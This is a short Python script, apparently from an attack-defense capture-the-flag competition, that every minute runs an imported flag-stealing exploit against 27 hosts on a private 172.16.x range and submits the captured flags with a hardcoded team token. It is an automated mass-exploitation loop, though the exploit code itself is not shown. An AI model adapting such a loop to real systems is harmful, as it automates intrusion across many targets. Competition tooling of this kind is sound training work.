#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests
import submit_flag
import get_flag
import time

token = "DqSXgARhK0brh2im8plcH4EdvluS2KmW8MpJCb0oeWQJoSYBrnLLdDtqzAbd78nAbZP9wFBjFEb"

def exploit(host, port):
    print "[+] Exploiting : [%s:%s]" % (host, port)
    flag = get_flag.get_flag(host, port)
    submit_flag.submit(flag, token)

def exploit_all(challenge_id):
    port = 20002
    hosts = []
    for host in range(1,27 + 1):
        hosts.append("172.16.%d.%d" % (host, 100 + challenge_id))
    for host in hosts:
        exploit(host, port)

def main():
    while True:
        exploit_all(2)
        time.sleep(60)

if __name__ == "__main__":
    main()
